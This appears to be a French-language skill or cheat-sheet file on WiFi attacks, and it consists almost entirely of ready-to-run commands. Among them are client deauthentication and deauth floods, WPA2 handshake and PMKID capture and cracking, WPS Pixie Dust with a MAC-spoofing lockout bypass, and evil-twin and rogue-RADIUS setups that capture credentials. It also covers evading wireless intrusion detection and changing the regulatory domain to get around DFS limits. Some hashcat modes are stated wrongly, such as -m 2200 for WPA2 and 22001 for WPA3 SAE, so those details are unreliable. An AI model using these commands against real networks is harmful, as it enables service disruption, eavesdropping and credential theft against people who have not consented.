---
name: wifi-hacking
description: WiFi Hacking — WPA2/WPA3, PMKID, KRACK, WPS Pixie, WPA2-Enterprise, Evil Twin, airebase, et outils de pentest sans-fil complets
tags: [wifi, wireless, WPA2, WPA3, PMKID, KRACK, evil-twin, aircrack, hacking]
version: 1.0
---

# WiFi Hacking

Guide complet de pentest et sécurité WiFi — de la capture de paquets à l'exploitation de réseaux sans-fil (2.4/5/6 GHz).

## 1. Préparation

### Matériel
```bash
# Chipset recommandés pour injection
# Atheros AR9271 (USB) — best support
# Ralink RT3070 (USB) — good
# Realtek RTL8812AU (USB AC) — 5GHz support
# Intel AX210 — monitor mode support (kernel 5.10+)

# Vérifier le chipset
lsusb
lsusb -t | grep -E "Network|Wireless"
iw list | grep "Supported interface modes"
```

### Mode Monitor
```bash
# Activer le mode monitor
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# Ou avec airmon-ng
airmon-ng check kill
airmon-ng start wlan0   # Crée wlan0mon

# Vérifier
iwconfig
iw dev wlan0mon info
```

### Outils
```bash
# Suite
aircrack-ng-1.7
reaver-1.6.6
hashcat-6.2.6
hcxdumptool
hcxpcapngtool
bully
```

## 2. Reconnaissance

```bash
# Scan des réseaux environnants
airodump-ng wlan0mon

# Scan avec filtres (bande, canal)
airodump-ng wlan0mon --band a   # 5GHz
airodump-ng wlan0mon --band abg # 2.4 + 5GHz
airodump-ng wlan0mon -c 6      # Canal spécifique

# Informations collectées
# BSSID, Channel, Encryption, ESSID, PWR, Beacon, Data, WPS
```

## 3. WPA2 Handshake Capture

### Passive (attente)
```bash
# Capturer le handshake 4-way
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Attendre qu'un client se connecte/déconnecte
# ou déauthentifier un client
```

### Active (déauthentification)
```bash
# Déauthentifier un client spécifique
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Déauthentifier broadcast (tous les clients)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# PMKID capture (routeurs WPA2 avec PMKID support)
hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=15
```

### Vérifier le handshake
```bash
# Vérifier qu'on a bien le handshake
airodump-ng -r capture-01.cap
# ou
cowpatty -r capture-01.cap -s ESSID -c
```

## 4. WPA2 Cracking

### Aircrack-ng
```bash
# CPU-based
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Avec des règles de transformation
aircrack-ng -w base.txt -r rules.txt capture-01.cap
```

### Hashcat (GPU)
```bash
# Convertir .cap en .hccapx
cap2hccapx capture-01.cap capture.hccapx

# Ou .hccapx direct
aircrack-ng capture-01.cap -J capture   # crée .hccapx

# Cracker avec Hashcat (mode 22000 pour WPA2)
hashcat -m 2200 capture.hccapx wordlist.txt
hashcat -m 2200 capture.hccapx wordlist.txt -r rules/best64.rule

# Mode 22000 (PMKID/EAPOL)
hcxpcaptool -z capture.22000 capture.pcapng
hashcat -m 22000 capture.22000 wordlist.txt
```

### PMKID Attack
```bash
# PMKID = HMAC-SHA1(PMK, "PMK Name" + BSSID + STA MAC)
# Avantage : pas besoin de client, pas de déauth

# Capture avec hcxdumptool
hcxdumptool -o capture.pcapng -i wlan0mon --enable_status=1

# Convertir
hcxpcaptool -z capture.22000 capture.pcapng

# Cracker
hashcat -m 22000 capture.22000 wordlist.txt
```

## 5. WPA3 Attack

### WPA3 Personal (SAE)
```bash
# Dragonblood attack (CVE-2019-9494, 9495, 9496, 9497, 9498, 9499)
# 1. Downgrade attack : WPA3 → WPA2 transition mode
# 2. Cache-based side channel (group negotiation)
# 3. Timing attack (password partition)
# 4. Dictionary attack on SAE commit

# Outils
# - hashcat -m 22001 (WPA3 SAE)
# - dragonblood tool (research implementation)
```

### WPA3-Enterprise (SuiteB 192-bit)
```bash
# Plus sécurisé, nécessite EAP-TLS
# Attaques : PKI compromise, client certificate theft
```

## 6. WPS Attack

### Pixie Dust
```bash
# Attaque sur WPS (Wi-Fi Protected Setup)
# Exploite les faiblesses RNG pour calculer PIN

# Reaver
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv -K 1

# Bully
bully -b AA:BB:CC:DD:EE:FF -d 3 -v 3 wlan0mon

# PixieWPS
pixiewps --e-hash1=... --e-hash2=... --e-nonce=... --bssid=... --authkey=...

# Si PIN trouvé → WPA2 PSK récupéré
# Reaver avec PIN
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345678
```

### WPS Lockout bypass
```bash
# Certains routeurs lockout après 3 tentatives
# Bypass : MAC spoofing (changer MAC toutes les 3 tentatives)
macchanger -m 00:11:22:33:44:55 wlan0mon
```

## 7. Evil Twin Attack

### Avec Airbase-ng
```bash
# 1. Créer un faux AP
airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# 2. Configurer NAT + DHCP
ifconfig at0 up
ifconfig at0 192.168.1.1/24
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i at0 -o eth0 -j ACCEPT
dnsmasq -C dnsmasq.conf -d

# 3. DNS spoofing ou captive portal
# 4. Capturer les credentials via le portal
```

### Avec Fluxion (automated)
```bash
git clone https://github.com/FluxionNetwork/fluxion
cd fluxion
./fluxion.sh
# Menu interactif : sélectionner réseau → méthode d'attaque
```

### Avec WiFiPhisher (automated)
```bash
git clone https://github.com/wifiphisher/wifiphisher
# Crée AP malveillant + captive portal
# Phishing : mises à jour firmware, login pages
```

## 8. WPA2-Enterprise Attacks

### RADIUS Cracking
```bash
# EAP-MD5 : crack direct
# EAP-MSCHAPv2 : asleap (MSCHAPv2 weakness)
# EAP-TLS : cert theft (rare)
# PEAP : man-in-the-middle

# asleap
asleap -r capture.pcap -f wordlist.txt -n hashes.dat
```

### FreeRADIUS MITM
```bash
# 1. Configurer fake RADIUS server
# 2. HostAPd + FreeRADIUS avec cert auto-signé
# 3. Client ignore warning → credentials capturés
# 4. EAP-MSCHAPv2 → crack with asleap
```

### HostAPd-WPE
```bash
# Wireless Pwnage Edition
# Automatique : fake AP + RADIUS + credential capture
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Output : /var/log/hostapd-wpe.log
```

## 9. KRACK Attack (CVE-2017-13077 à 13088)

```bash
# Key Reinstallation Attack
# Exploite la 3e étape du 4-way handshake
# Force la réinstallation de la même clé de session

# Impact : WPA2 (tous clients)
# - Déchiffrement des paquets
# - Forge de paquets
# - Injection de malwares

# Outils :
# - krackattacks-scripts (research)
# - hcxdumptool (KRACK detection)
# - Patché dans la plupart des OS depuis 2017
```

## 10. Beacon Flood & Deauth

### Beacon Flood
```bash
# Flood de faux APs (MDK3)
mdk3 wlan0mon b -c 6 -n "FakeSSID" -t AA:BB:CC:DD:EE:FF -s 1000

# MDK4 (nouveau)
mdk4 wlan0mon b -c 6 -n "FakeNet" -t AA:BB:CC:DD:EE:FF -s 1000
```

### Deauth Flood
```bash
# Déauthentifier tous les clients
mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF -s 1000
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon  # Infini

# Détection : watchdog sur séquence de management frames
```

## 11. WPA2 Enterprise RADIUS Cracking

### EAPOL Analysis
```bash
# Wireshark filter : eapol
# Analyser : EAP type, cipher suite, key version
# Cracking with eapmd5pass
eapmd5pass -r capture.pcap -w wordlist.txt
```

## 12. 5GHz & 6GHz (WiFi 6E)

```bash
# 5GHz : canaux 36-165 (DFS, UNII bands)
# 6GHz : canaux 1-233 (WiFi 6E, pas de radar)

# Activer 5GHz sur la carte
iw reg set BO     # Bolivia (pas de restrictions DFS)
iw dev wlan0 set channel 149 HT20

# 6GHz : support limité
# Nécessite : Intel AX210, kernel 5.10+
# ESP : Protected Management Frames (PMF) obligatoire
```

## 13. WIDS/WIPS Evasion

```bash
# Éviter la détection par WIPS (Wireless IPS)
# - Slow scan : varier temps entre probe
# - MAC randomization : changer toutes les 5-10 frames
# - Low power : garder TX power bas
# - Fragmentation : envoyer en fragments
# - Timing : imiter trafic légitime

# Simulate legitimate client
# - ARP, DHCP, DNS queries
# - Beacon interval matching
# - Rate adaptation
```

## 14. Tools Compendium

| Outil | Usage | Commande clé |
|-------|-------|-------------|
| **Aircrack-ng** | Suite complète | `aircrack-ng -w wordlist capture.cap` |
| **Airodump-ng** | Capture paquets | `airodump-ng -c 6 -w out wlan0mon` |
| **Aireplay-ng** | Injection | `aireplay-ng -0 5 -a BSSID wlan0mon` |
| **Airmon-ng** | Monitor mode | `airmon-ng start wlan0` |
| **Reaver** | WPS attack | `reaver -i wlan0mon -b BSSID -vv` |
| **Bully** | WPS attack | `bully -b BSSID wlan0mon` |
| **Pixiewps** | Pixie Dust calc | `pixiewps --pke=...` |
| **hcxdumptool** | PMKID capture | `hcxdumptool -o out.pcapng -i wlan0mon` |
| **Hashcat** | GPU cracking | `hashcat -m 22000 capture.22000 wordlist.txt` |
| **MDK3/4** | Flood attacks | `mdk4 wlan0mon d -B BSSID` |
| **HostAPd-WPE** | Enterprise AP | `hostapd-wpe hostapd-wpe.conf` |
| **Fluxion** | Evil Twin auto | `./fluxion.sh` |
| **WiFiPhisher** | Phishing auto | `./wifiphisher` |
| **Kismet** | IDS sniffer | `kismet -c wlan0mon` |

## 15. Ressources

- **Aircrack-ng Docs** : https://www.aircrack-ng.org/documentation.html
- **Hashcat Modes** : https://hashcat.net/wiki/doku.php?id=example_hashes
- **WiFi-Pumpkin** : https://github.com/P0cL4bs/WiFi-Pumpkin
- **Bettercap** : https://www.bettercap.org (WiFi + BLE + 802.15.4)
- **Wifite** : https://github.com/derv82/wifite2 (automated)
- **KRACK docs** : https://www.krackattacks.com